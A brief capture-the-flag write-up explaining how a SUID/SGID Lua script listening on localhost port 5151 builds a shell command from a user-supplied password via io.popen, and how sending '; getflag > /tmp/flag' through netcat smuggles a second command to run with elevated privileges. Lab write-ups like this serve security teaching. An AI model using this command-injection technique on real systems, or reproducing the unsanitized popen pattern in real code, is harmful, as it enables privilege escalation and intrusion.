First I saw level11.lua permissions (SUID + SGID)

Then I read the script. It was waiting for a tcp connection, listening on localhost and port 5151
It would then try to hash the password with io.popen and compare it to a hash

We can inject a shell command here `prog = io.popen("echo "..pass.." | sha1sum", "r")`

`netcat localhost 5151` to connect to the socket
and then type `; getflag > /tmp/flag`
io.popen is executing 'echo; getflag > /tmp/flag | sha1sum'. getflag output is redirected to a file before the pipe

Then we just need to `cat /tmp/flag` to get our flag :)
